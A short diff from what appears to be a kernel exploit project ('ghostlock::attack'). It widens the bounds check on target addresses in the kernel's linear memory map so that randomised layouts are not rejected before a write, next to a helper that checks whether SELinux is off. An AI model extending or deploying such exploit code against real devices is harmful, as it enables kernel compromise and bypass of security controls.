@@ -23,9 +23,21 @@ namespace ghostlock::attack {
         return ghostlock::runtime_time::runtime_elapsed_ms(&exploit_t0());
     }
 
-        inline int32_t in_direct_map(uintptr_t target) {
+        /* The upper bound is the architectural end of the linear region, not the
+     * built-in g_direct_map_end guess: with memstart_addr randomised the linear
+     * alias of a kernel-image symbol can legitimately sit far above 64 GiB (a
+     * Razer Edge WiFi boot measured 154 GiB), and the guess would reject every
+     * such target without writing anything. apply_iomem_cache() still narrows
+     * it when a real memory map is available.
+     *
+     * This stays a coarse sanity check: it rejects anything below the linear
+     * region and anything in the vmalloc/kimage half above it. A tighter guard
+     * would bound the target by the DRAM-backed span that a successful leak
+     * reveals for the current boot; that needs the leak plumbed in here and is
+     * a separate change. */
+    inline int32_t in_direct_map(uintptr_t target) {
         return target > ghostlock::kernel::DIRECT_MAP_BASE &&
-               target < ghostlock::kernel::g_direct_map_end;
+               target < ghostlock::kernel::direct_map_scan_end();
     }
 
     inline int32_t check_selinux_off(void) {
